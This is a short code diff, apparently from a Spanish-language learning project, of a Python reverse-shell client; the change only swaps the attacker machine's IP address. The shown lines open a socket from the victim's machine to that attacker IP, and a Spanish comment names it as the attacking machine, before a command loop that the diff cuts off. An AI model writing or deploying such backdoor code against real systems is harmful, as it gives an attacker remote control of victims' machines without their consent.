@@ -4,7 +4,7 @@ import subprocess
 client = socket.socket()
 
 try:
-    client.connect(('192.168.1.65', 8080)) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
+    client.connect(('192.168.1.68', 8080)) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
     client.send("1".encode("ascii"))
 
     while True:
